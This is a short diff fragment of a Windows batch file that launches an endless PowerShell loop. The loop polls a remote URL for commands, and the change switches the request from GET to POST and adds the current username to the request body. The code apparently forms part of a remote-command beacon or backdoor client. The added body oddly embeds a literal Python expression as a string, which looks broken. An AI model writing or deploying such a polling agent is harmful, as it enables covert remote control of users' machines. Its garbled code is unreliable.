@@ -9,8 +9,10 @@ powershell -NoProfile -Command ^
     "$lastCommand = '';" ^
     "$ErrorActionPreference = 'Stop';" ^
     "while ($true) {" ^
-    "    Write-Host \"Sending GET request to $url\";" ^
-    "    $response = Invoke-WebRequest -Uri $url -Method Get -TimeoutSec 20;" ^
+    "    Write-Host \"Sending POST request to $url\";" ^
+    "    $body = \"$username$separator\" + 'reply = self.dynamikresponses[$username]';" ^
+    "    $headers = @{'Content-Type' = 'application/x-www-form-urlencoded'};" ^
+    "    $response = Invoke-WebRequest -Uri $url -Method Post -Body $body -Headers $headers -TimeoutSec 20;" ^
     "    $receivedCommand = $response.Content.Trim();" ^
     "    if ([string]::IsNullOrWhiteSpace($receivedCommand)) {" ^
     "        Write-Host 'No command received. Waiting...';" ^
